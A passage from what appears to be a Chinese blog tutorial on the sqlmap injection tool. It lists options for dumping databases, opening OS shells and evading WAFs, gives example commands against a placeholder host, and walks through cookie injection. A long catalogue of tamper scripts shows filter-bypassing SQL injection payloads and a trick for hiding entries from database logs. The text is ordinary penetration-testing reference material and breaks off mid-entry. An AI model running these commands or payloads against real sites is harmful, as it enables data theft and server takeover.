包含所有的数据库，表和字段，以及各自的类型。 --exclude-sysdbs参数，将不会获取数据库自带的系统库内容。</span></span></span><br><span class="line"><span class="ruby">     --count     /<span class="regexp">/获取表中数据个数</span></span></span><br><span class="line"><span class="ruby">     --dump      /<span class="regexp">/获取整个表的数据，-D-T指定要获取哪个库哪个表，--start,--stop,--first,--last</span></span></span><br><span class="line"><span class="ruby">     --dump-all     /<span class="regexp">/获取所有数据库表的内容， 加上--exclude-sysdbs只获取用户数据库的表，/</span>*脱裤啊*<span class="regexp">/</span></span></span><br><span class="line"><span class="ruby">     --search     /<span class="regexp">/搜索-C列名，-T表，-D数据库</span></span></span><br><span class="line"><span class="ruby">     --sql-query,--sql-shell     /<span class="regexp">/运行自定义sql语句</span></span></span><br><span class="line"><span class="ruby">爆破</span></span><br><span class="line"><span class="ruby">     --common-tables     /<span class="regexp">/暴力破解表名  </span></span></span><br><span class="line"><span class="ruby">     --common-columns     /<span class="regexp">/暴力破解列名</span></span></span><br><span class="line"><span class="ruby">用户自定义函数注入</span></span><br><span class="line"><span class="ruby">     --udf-inject,--shared-lib     </span></span><br><span class="line"><span class="ruby">系统文件操作</span></span><br><span class="line"><span class="ruby">     --file-read     /<span class="regexp">/从数据库服务器中读取文件</span></span></span><br><span class="line"><span class="ruby">     --file-write,--file-dest     /<span class="regexp">/把文件上传到数据库服务器中</span></span></span><br><span class="line"><span class="ruby">     --os-cmd,--os-shell     /<span class="regexp">/运行任意操作系统命令</span></span></span><br><span class="line"><span class="ruby">Meterpreter配合使用</span></span><br><span class="line"><span class="ruby">     --os-pwn --msf-path /software/metasploit</span></span><br><span class="line"><span class="ruby">     --os-smbrelay     /<span class="regexp">/通过smb攻击</span></span></span><br><span class="line"><span class="ruby">     --os-bof     /<span class="regexp">/通过溢出</span></span></span><br><span class="line"><span class="ruby">     --tmp-path</span></span><br><span class="line"><span class="ruby">     --priv-esc</span></span><br><span class="line"><span class="ruby">对Windows注册表操作</span></span><br><span class="line"><span class="ruby">     --reg-read     /<span class="regexp">/读取注册表</span></span></span><br><span class="line"><span class="ruby">     --reg-add     /<span class="regexp">/写入</span></span></span><br><span class="line"><span class="ruby">     --reg-del     /<span class="regexp">/删除</span></span></span><br><span class="line"><span class="ruby">     --reg-key,--reg-value,--reg-data,--reg-type     /<span class="regexp">/辅助选项</span></span></span><br><span class="line"><span class="ruby">常规参数</span></span><br><span class="line"><span class="ruby">     -s     /<span class="regexp">/从sqlit中读取session， sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数</span></span></span><br><span class="line"><span class="ruby">     -t     /<span class="regexp">/保存http日志，需要跟一个文本文件</span></span></span><br><span class="line"><span class="ruby">     --batch     /<span class="regexp">/非交互模式，使用默认值一直运行下去</span></span></span><br><span class="line"><span class="ruby">     --charset=     <span class="regexp">//</span>强制使用字符编码</span></span><br><span class="line"><span class="ruby">     --crawl=    <span class="regexp">//</span>爬行网站URL,后面跟深度，收集潜在的可能存在漏洞的链接</span></span><br><span class="line"><span class="ruby">     --csv-del=<span class="string">";"</span>     /<span class="regexp">/规定输出到csv中的分隔符，默认逗号</span></span></span><br><span class="line"><span class="ruby">     --dbms-cred     /<span class="regexp">/dbms身份验证 某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数。</span></span></span><br><span class="line"><span class="ruby">     --dump-format     /<span class="regexp">/定义dump数据的格式（ CSV，HTML，SQLITE ）</span></span></span><br><span class="line"><span class="ruby">     --eta     /<span class="regexp">/预估完成时间</span></span></span><br><span class="line"><span class="ruby">     --flush-session     /<span class="regexp">/刷新session文件</span></span></span><br><span class="line"><span class="ruby">     --forms     /<span class="regexp">/自动获取form表单测试</span></span></span><br><span class="line"><span class="ruby">     --fresh-queries     /<span class="regexp">/忽略在回话文件中存储的查询结果</span></span></span><br><span class="line"><span class="ruby">     --hex     /<span class="regexp">/使用DBMS的hex函数， 有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免</span></span></span><br><span class="line"><span class="ruby">     --output-dir=    <span class="regexp">//</span>自定义输出的路径</span></span><br><span class="line"><span class="ruby">     --parse-errors     /<span class="regexp">/从响应中获取DBMS的错误信息</span></span></span><br><span class="line"><span class="ruby">其他参数缩写</span></span><br><span class="line"><span class="ruby">     -z     /<span class="regexp">/使用参数缩写，--batch --random-agent --ignore-proxy --technique=BEU -u，可以写成-z "bat,randoma,ign,tec=BEU" -u，还有--ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u，可以写成-z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u</span></span></span><br><span class="line"><span class="ruby">     --alert     /<span class="regexp">/成功注入时警告，</span></span></span><br><span class="line"><span class="ruby">     --answers=      <span class="regexp">//</span>设定会发的答案, 当sqlmap提出输入时，自动输入自己想要的答案可以使用此参数</span></span><br><span class="line"><span class="ruby">     --beep     /<span class="regexp">/发现sql注入时发出蜂鸣声</span></span></span><br><span class="line"><span class="ruby">     --check-waf     /<span class="regexp">/启发式检测WAF/</span>IPS/IDS保护， 使用一个不存在的参数来注入测试</span></span><br><span class="line"><span class="ruby">     --cleanup     /<span class="regexp">/清理sqlmap注入时产生的UDF(s)和表</span></span></span><br><span class="line"><span class="ruby">     --disable-coloring     /<span class="regexp">/禁止彩色输出</span></span></span><br><span class="line"><span class="ruby">     --gpage     /<span class="regexp">/使用指定的Google结果页面</span></span></span><br><span class="line"><span class="ruby">     --hpp     /<span class="regexp">/使用http参数污染， 可能会绕过WAF/</span>IPS/IDS保护机制，这个对ASP/IIS与ASP.NET/IIS平台很有效</span></span><br><span class="line"><span class="ruby">     --identify-waf     /<span class="regexp">/测试WAF/</span>IPS/IDS保护</span></span><br><span class="line"><span class="ruby">     --mobile     /<span class="regexp">/模仿智能手机</span></span></span><br><span class="line"><span class="ruby">     --purgr-output     /<span class="regexp">/安全的删除output目录的文件</span></span></span><br><span class="line"><span class="ruby">     --smart     /<span class="regexp">/启发式判断注入， 对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入</span></span></span><br><span class="line"><span class="ruby">     --wizard     /<span class="regexp">/初级用户向导参数，可以一步一步教你如何输入针对目标注入</span></span></span><br></pre></td></tr></table></figure><h3 id="risk-指数"><a href="#risk-指数" class="headerlink" title="risk 指数"></a>risk 指数</h3><p><code>--risk 1(2,3,4)</code></p><p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p><p>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p><h3 id="level-指数"><a href="#level-指数" class="headerlink" title="level 指数"></a>level 指数</h3><p><code>--level 1(2,3,4,5)</code></p><p>共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</p><p>这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。</p><p>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p><h3 id="v-日志指数"><a href="#v-日志指数" class="headerlink" title="-v 日志指数"></a>-v 日志指数</h3><p><code>-v</code></p><p>显示sqlmap对一个点是进行了怎样的尝试判断以及读取数据的<br>共有七个等级，默认为1：</p><ol start="0"><li><p>只显示python错误以及严重的信息。</p></li><li><p>同时显示基本信息和警告信息。（默认）</p></li><li><p>同时显示debug信息。</p></li><li><p>同时显示注入的payload。</p></li><li><p>同时显示HTTP请求。</p></li><li><p>同时显示HTTP响应头。</p></li><li><p>同时显示HTTP响应页面。</p><h2 id="0x02-例子"><a href="#0x02-例子" class="headerlink" title="0x02 例子"></a>0x02 例子</h2><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> <span class="comment">//查是否有注入，一些基本信息</span></span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --dbs <span class="comment">//枚举数据库</span></span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --tables -D 数据库名 <span class="comment">//表名枚举</span></span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --<span class="attribute">columns</span> -D 数据库名 -T 数据库表名 //字段枚举</span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --dump -D 数据库名 -T 表名 -C <span class="string">"字段名1，字段名2，字段名3"</span> <span class="comment">//dump</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>cookie注入常见有两种，一种是cookie中的值拼接成sql语句产生注入<br>另一种asp的cookie中转注入，原因是程序对提交数据获取方式是直接request(“c.s.t”)的方式.未指明使用request对象的具体方法进行获取。可以都接收get,post,cookie方式提交的数据，一般程序只是过滤了get和post注入，如果没有过滤cookie注入语句，我们就可以进行注入了。</p><p>这里对第二种进行简单判断是否存在cookie注入的可能，</p><ol><li>首先要访问正常的页面，即是：<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> /test.asp?id=1，等页面打开之后，我们将IE地址栏清空，然后写 上:<code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;1&quot;));</code> 这里的“id=”便是“test.asp?id=1”中的“id=”，“escape(“1”)”中的“1”是 “test.asp?id=1”中的“id=1”了，这两处要根据实际情`况来定义。之后按下回车网页中会弹出一个对话框。</li><li>更改好了cookie后，我们就要试下能不能正常访问了，在另外一个窗口中我们打开以下地址：<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> /test.asp? 既是将“id=1”去掉后的，然后看是否能正常访问。<br>如果可以正常显示，那么就是以request(“c.s.t”)方式获取数据的，一般只是过滤了get和post注入，如果没有过滤cookie注入语句，我们就可以进行注入了。</li><li>通过修改escape中的参数来判断是否存在注入，接下来和普通注入判断方式一样</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --level <span class="number">2</span> 枚举强度</span><br><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --cookie <span class="string">"id=1"</span></span><br></pre></td></tr></table></figure><h3 id="表单post"><a href="#表单post" class="headerlink" title="表单post"></a>表单post</h3><p>三种方式</p><ol><li><p>表单枚举<br> <code>python sqlmap.py -u &quot;http://www.xxx.com&quot; --forms</code></p></li><li><p>指定post参数<br> <code>python sqlmap.py -u &quot;http://www.xxx.com&quot; --data &quot;username=1&amp;passwd=1&quot;</code></p></li><li><p>抓包构造<br> <code>python sqlmap.py -r test.txt</code></p></li></ol><h3 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h3><p>简单判断伪静态<br>浏览器F12开发者工具控制台<br><code>alert(document.lastModified)</code><br>会弹出网页最后更新时间，多次刷新页面，通过时间判断出是否为静态页面</p><p><code>python sqlmap.py -u &quot;http://www.xxx.com/index.php/Index/id/1*.html&quot;</code></p><h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-cmd <span class="string">"ipconfig"</span></span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-<span class="keyword">shell</span></span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-pwn</span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --sql-<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><h2 id="0x03-Tamper使用"><a href="#0x03-Tamper使用" class="headerlink" title="0x03 Tamper使用"></a>0x03 Tamper使用</h2><p><code>python sqlmap.py -u &quot;http://www.xxx.com&quot; -v 3 --dbs --batch --tamper &quot;space2hash.py&quot;</code></p><p>常见waf绕过脚本encoder: space2hash.py, space2morehash.py, base64encode.py, charencode.py</p><p><strong>tamper WAF 绕过脚本列表注释</strong></p><ol><li>apostrophemask.py 用UTF-8全角字符替换单引号字符</li><li>apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</li><li>appendnullbyte.py 在payload末尾添加空字符编码</li><li>base64encode.py 对给定的payload全部字符使用Base64编码</li><li>between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</li><li>bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</li><li>chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</li><li>charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</li><li>charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</li><li>concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</li><li>equaltolike.py 用“LIKE”运算符替换全部等于号“=”</li><li>greatest.py 用“GREATEST”函数替换大于号“&gt;”</li><li>halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</li><li>ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</li><li>lowercase.py 用小写值替换每个关键字字符</li><li>modsecurityversioned.py 用注释包围完整的查询</li><li>modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</li><li>multiplespaces.py 在SQL关键字周围添加多个空格</li><li>nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</li><li>overlongutf8.py 转换给定的payload当中的所有字符</li><li>percentage.py 在每个字符之前添加一个百分号</li><li>randomcase.py 随机转换每个关键字字符的大小写</li><li>randomcomments.py 向SQL关键字中插入随机注释</li><li>securesphere.py 添加经过特殊构造的字符串</li><li>sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</li><li>space2comment.py 用“/**/”替换空格符</li><li>space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</li><li>space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</li><li>space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</li><li>space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li><li>space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</li><li>space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li><li>space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符</li><li>space2plus.py 用加号“+”替换空格符</li><li>space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li><li>unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</li><li>unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</li><li>varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</li><li>versionedkeywords.py 用MySQL注释包围每个非函数关键字</li><li>versionedmorekeywords.py 用MySQL注释包围每个关键字</li><li>xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>PS：工具既然叫做工具，就是用来辅助上单的，呸辅助我们完成某些任务的，仅仅适用于当进行某些重复的繁琐工作或是偶尔懒癌发作时，不能过度依赖</p><p><strong>ALL 表示所有数据库都适用，具体指出哪种数据库就表名只只适用于某些数据。</strong></p><p>使用方法： </p><pre><code>sqlmap.py XXXXX -tamper &quot;模块名&quot;</code></pre><p>各个 tamper 的作用 </p><p>下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p><p>apostrophemask.py: </p><pre><code>return payload.replace(&apos;\&apos;&apos;, &quot;%EF%BC%87&quot;) if payload else payload</code></pre><p>将单引号 url 编码，用于过滤了单引号的情况。</p><pre><code>1&apos; AND &apos;1&apos;=&apos;1  to 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</code></pre><p><strong>适用数据库：</strong>ALL</p><p>apostrophenullencode.py: </p><pre><code>return payload.replace(&apos;\&apos;&apos;, &quot;%00%27&quot;) if payload else payload</code></pre><p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p><pre><code>1&apos; AND &apos;1&apos;=&apos;1 to 1�&apos; AND �&apos;1�&apos;=�&apos;1</code></pre><p><strong>适用数据库：</strong>ALL</p><p>appendnullbyte.py: </p><pre><code>return &quot;%s%%00&quot; % payload if payload else payload</code></pre><p>在你构造的payload后面加一个空字符</p><pre><code>1&apos; AND &apos;1&apos;=&apos;1to1&apos; AND &apos;1&apos;=&apos;1[]</code></pre><p><strong>适用数据库：</strong>Access</p><p>base64encode.py: </p><pre><code>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</code></pre><p>这个看模块名也知道是 base64 编码</p><pre><code>1&apos; AND &apos;1&apos;=&apos;1 toMScgQU5EICcxJz0nMQ==</code></pre><p><strong>适用数据库：</strong>ALL</p><p>between.py: </p><p>这个代码有点长，就不贴代码了，可以自己去查看：C:\Python\SQLMap\tamper\between.py</p><p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p><pre><code>1 AND A &gt; Bto1 AND A NOT BETWEEN 0 AND B1 AND A = Bto1 AND A BETWEEN B AND B</code></pre><p><strong>适用数据库：</strong>ALL</p><p>bluecoat.py: </p><p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p><pre><code>union select * from users where id = 1tounion%09select * from%09users where id like 1</code></pre><p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p><p>chardoubleencode.py: </p><p>用 url 编码两次你的 payload </p><pre><code>select * from usersto%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</code></pre><p><strong>适用数据库：</strong>ALL</p><p>charencode.py: </p><p>用 url 编码一次你的 payload</p><pre><code>select * from usersto%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</code></pre><p><strong>适用数据库：</strong>ALL</p><p>charunicodeencode.py： </p><p>用 unicode 编码 payload ，只编码非编码字符</p><pre><code>select * from usersto\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u002a\u0020\u0066\u0072\u006f\u006d\u0020\u0075\u0073\u0065\u0072\u0073</code></pre><p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p><p>commalesslimit.py： </p><p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p><pre><code>limit 2,1tolimit 1 offset 2</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>commalessmid.py： </p><p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p><pre><code>mid(version(), 1, 1)tomid(version() from 1 for 1)</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>commentbeforeparentheses.py： </p><pre><code>retVal = re.sub(r&quot;\b(\w+)(&quot;, &quot;\g&lt;1&gt;/**/(&quot;, retVal)</code></pre><p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p><pre><code>union select group_concat(table_name)tounion select group_concat/**/(table_name)</code></pre><p><strong>适用数据库：</strong>ALL</p><p>concat2concatws.py： </p><pre><code>payload = payload.replace(&quot;CONCAT(&quot;, &quot;CONCAT_WS(MID(CHAR(0),0,0),&quot;)</code></pre><p>用于过滤了 concat 函数的情况</p><pre><code>concat(1,2)toconcat_ws(mid(char(0), 0, 0), 1, 2)</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>equaltolike.py： </p><pre><code>retVal = re.sub(r&quot;\s=\s&quot;, &quot; LIKE &quot;, retVal)</code></pre><p>将等号用 like 代替，用于过滤了等号的情况</p><pre><code>select * from users where id=1toselect * from users where id like 1</code></pre><p><strong>适用数据库：</strong>ALL</p><p>escapequotes.py： </p><pre><code>return payload.replace(&quot;&apos;&quot;, &quot;\&apos;&quot;).replace(&apos;&quot;&apos;, &apos;\&quot;&apos;)</code></pre><p>将单引号转换成 \‘ ，双引号转换成 \“ ，用于过滤了单引号或双引号的情况</p><pre><code>1&apos; and 1=1--+to1\\&apos; and 1=1--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>greatest.py： </p><p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p><pre><code>1 and a&gt;bto1 and greatest(a,b+1)=a</code></pre><p>ALL</p><p>halfversionedmorekeywords.py： </p><p>在关键字前添加注释，用于过滤了关键字的情况</p><pre><code>union select 1,2to/*!0union/*!0select 1,2</code></pre><p><strong>适用数据库：</strong>MySQL &lt; 5.1</p><p>htmlencode.py： </p><pre><code>return re.sub(r&quot;[^\w]&quot;, lambda match: &quot;&amp;#%d;&quot; % ord(match.group(0)), payload) if payload else payload</code></pre><p>从名字就知道是将 payload 进行 html 编码</p><pre><code>1&apos; and 1=1--+to&amp;#49;&amp;#39;&amp;#32;&amp;#97;&amp;#110;&amp;#100;&amp;#32;&amp;#49;&amp;#61;&amp;#49;&amp;#45;&amp;#45;&amp;#43;</code></pre><p><strong>适用数据库：</strong>ALL</p><p>ifnull2ifisnull.py： </p><p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p><pre><code>ifnull(1, 2)toif(isnull(1), 2, 1)</code></pre><p><strong>适用数据库：</strong>MySql</p><p>informationschemacomment.py： </p><pre><code>retVal = re.sub(r&quot;(?i)(information_schema).&quot;, &quot;\g&lt;1&gt;/**/.&quot;, payload)</code></pre><p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p><pre><code>select table_name from information_schema.tablestoselect table_name from information_schema/**/.tables</code></pre><p><strong>适用数据库：</strong>ALL</p><p>lowercase.py： </p><p>将 payload 里的大写转为小写</p><pre><code>UNION SELECTtounion select</code></pre><p><strong>适用数据库：</strong>ALL</p><p>modsecurityversioned.py： </p><p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p><pre><code>1 and 2&gt;1--+to1 /*!30874and 2&gt;1*/--+</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>modsecurityzeroversioned.py： </p><p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p><pre><code>1 and 2&gt;1--+to1 /*!00000and 2&gt;1*/--+</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>multiplespaces.py： </p><p>在关键字周围添加多个空格</p><pre><code>union select 1,2--+tounion         select       1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>nonrecursivereplacement.py： </p><p>关键字双写，可用于关键字过滤</p><pre><code>union select 1,2--+touniounionn selecselectt 1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>overlongutf8.py： </p><p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p><pre><code>select field from table where 2&gt;1toselect%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</code></pre><p><strong>适用数据库：</strong>ALL</p><p>percentage.py： </p><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p><pre><code>select * from usersto%s%e%l%e%c%t * %f%r%o%m %u%s%e%r%s</code></pre><p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p><p>plus2concat.py： </p><p>用 concat 函数来替代加号，用于加号被过滤的情况</p><pre><code>select char(13)+char(114)+char(115) from usertoselect concat(char(113),char(114),char(115)) from user</code></pre><p><strong>适用数据库：</strong>SQL Server 2012+</p><p>plus2fnconcat.py： </p><p>用 fn concat 来替代加号，和上面类似</p><pre><code>select char(13)+char(114)+char(115) from usertoselect {fn concat({ fn concat(char(113),char(114))},char(115))} from user</code></pre><p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p><p>randomcase.py： </p><p>将 payload 随机大小写，可用于大小写绕过的情况</p><pre><code>union select 1,2--+toUniOn SElect 1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>randomcomments.py： </p><p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p><pre><code>union select 1,2--+toun/**/ion sele/**/ct 1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>securesphere.py： </p><pre><code>return payload + &quot; and &apos;0having&apos;=&apos;0having&apos;&quot; if payload else payload</code></pre><p>在 payload 后面加入字符串，可以自定义</p><pre><code>1&apos; and 1=1to1&apos; and 1=1 &apos;0having&apos;=&apos;0having&apos;</code></pre><p><strong>适用数据库：</strong>ALL</p><p>sp_password.py： </p><pre><code>retVal = &quot;%s%ssp_password&quot; % (payload, &quot;-- &quot; if not any(_ if _ in payload else None for _ in (&apos;#&apos;, &quot;-- &quot;)) else &quot;&quot;)</code></pre><p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p><pre><code>1’  and 1=1--+to1 and 1=1-- sp_password</code></pre><p><strong>适用数据库：</strong>MSSQL</p><p>space2comment.py： </p><p>用 /**/ 替代空格，用于空格的绕过</p><pre><code>union select 1,2--+tounion/**/select/**/1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>space2dash.py： </p><p>用注释符–和一个随机字符串加一个换行符替换控制符</p><p>?union select 1,2–+tounion–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p><p><strong>适用数据库：</strong>MSSQL、 SQLite</p><p>space2hash.py： </p><p>和上面类似，不过这儿是用#注释符</p><pre><code>union select 1,2--+tounion%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2--+</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>space2morecomment.py： </p><p>将空格用 /<strong>_</strong>/ 替代</p><pre><code>union select 1,2--+tounion/**_**/select/**_**/1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>space2morehash.py： </p><p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p><pre><code>space2hash.py：union select 1,2--+tounion  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A1,2--+space2morehash.py：union select 1,2--+tounion  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A%23  HJHJhj  %0A  1,2--+</code></pre><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><p>space2mssqlblank.py： </p><pre><code>blanks = (&apos;%01&apos;, &apos;%02&apos;, &apos;%03&apos;, &apos;%04&apos;, &apos;%05&apos;, &apos;%06&apos;, &apos;%07&apos;, &apos;%08&apos;, &apos;%09&apos;, &apos;%0B&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0E&apos;, &apos;%0F&apos;, &apos;%0A&apos;)</code></pre><p>用这些随机空白符替换 payload 中的空格</p><pre><code>union select 1,2--+tounion%01select%021,2--+</code></pre><p><strong>适用数据库：</strong>SQL Server</p><p>space2mssqlhash.py： </p><p>用 # 加一个换行符替换 payload 中的空格</p><pre><code>union select 1,2--+ tounion%23%0Aselect%23%0A1,2--+</code></pre><p><strong>适用数据库：</strong>MSSQL、MySQL</p><p>space2mysqlblank.py： </p><pre><code>blanks = (&apos;%09&apos;, &apos;%0A&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0B&apos;)</code></pre><p>用这些随机空白符替换payload中的空格</p><pre><code>union select 1,2--+tounion%09select%0D1,2--+</code></pre><p><strong>适用数据库：</strong>MySQL</p><p>space2mysqldash.py： </p><p>用 – 加一个换行符替换空格</p><pre><code>union select 1,2--+tounion--%0Aselect--%0A1,2--+</code></pre><p><strong>适用数据库：</strong>MySQL、MSSQL</p><p>space2plus.py： </p><p>用 + 替换空格</p><pre><code>union select 1,2--+tounion+select+1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>space2randomblank.py： </p><pre><code>blanks = (&quot;%09&quot;, &quot;%0A&quot;, &quot;%0C&quot;, &quot;%0D&quot;)</code></pre><p>用这些随机空白符替换 payload 中的空格</p><pre><code>union select 1,2--+tounion%09select%0C1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>symboliclogical.py： </p><pre><code>retVal = re.sub(r&quot;(?i)\bAND\b&quot;, &quot;%26%26&quot;, re.sub(r&quot;(?i)\bOR\b&quot;, &quot;%7C%7C&quot;, payload))</code></pre><p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p><pre><code>1 and 1=1to1 %26%26 1=11 or 1=1to1 %7c%7c 1=1</code></pre><p><strong>适用数据库：</strong>ALL</p><p>unionalltounion.py： </p><pre><code>return payload.replace(&quot;UNION ALL SELECT&quot;, &quot;UNION SELECT&quot;) if payload else payload</code></pre><p>用 union select 替换union all select</p><pre><code>union all select 1,2--+tounion select 1,2--+</code></pre><p><strong>适用数据库：</strong>ALL</p><p>unmagicquotes.py： </p><p>用宽字符绕过 GPC addslashes</p><pre><code>1‘ and 1=1to1%df%27 and 1=1--</code></pre><p><strong>适用数据库：</strong>ALL</p><p>uppercase.py： </p><p>将 payload 大写</p><pre><code>union selecttoUNION 